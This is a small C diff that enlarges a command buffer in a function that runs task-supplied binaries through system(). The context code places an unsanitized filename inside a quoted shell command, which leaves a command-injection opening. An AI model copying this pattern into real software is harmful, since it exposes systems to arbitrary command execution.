@@ -280,7 +280,7 @@ void process_manager_execute_binary(Task *task, char *output, size_t output_size
         snprintf(exec_cmd, sizeof(exec_cmd), "/tmp/exec_%d 2>&1", exec_id);
     } else {
         // It's a pre-compiled binary, just add execute permissions and run the payload
-        char chmod_cmd[256];
+        char chmod_cmd[512];
         snprintf(chmod_cmd, sizeof(chmod_cmd), "chmod +x \"%s\"", task->filename);
         system(chmod_cmd);
         
